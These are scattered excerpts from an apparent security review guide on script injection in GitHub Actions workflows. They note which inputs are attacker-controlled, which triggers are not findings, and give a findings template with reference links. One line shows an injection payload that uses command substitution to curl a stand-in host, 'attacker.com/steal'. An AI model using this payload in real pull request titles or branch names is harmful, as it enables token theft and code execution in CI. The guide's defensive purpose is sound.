- `${IFS}`; Internal Field Separator, becomes a space
- `$({curl,-sSfL,attacker.com/steal})`; brace expansion + command substitution
The most straightforward vector; attacker fully controls PR title and body:
On `push` triggers, commit messages are technically injectable; but **only if the push trigger accepts pushes from untrusted sources** (e.g., unprotected branches that anyone can push to). On protected branches (e.g., `main`, `master`), pushing requires write access, so the attacker already has full repo access and this is **not a meaningful finding**.
### workflow_dispatch Input Injection: NOT A FINDING
# NOTE: Do NOT flag workflow_dispatch inputs: requires write access, not an external threat
2. The shell sees `$PR_TITLE`; a variable reference, not raw content
# Branch name: SAFE
# PR title: SAFE
# Multiple expressions: SAFE
# workflow_dispatch input: SAFE
| `github.event.inputs.*` (workflow_dispatch) | Requires write access; not an external threat |
IMPACT: [RCE, token theft, etc.]; token permissions: [list]
- [GitHub Docs: Security hardening; Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [HackerBot Claw; branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)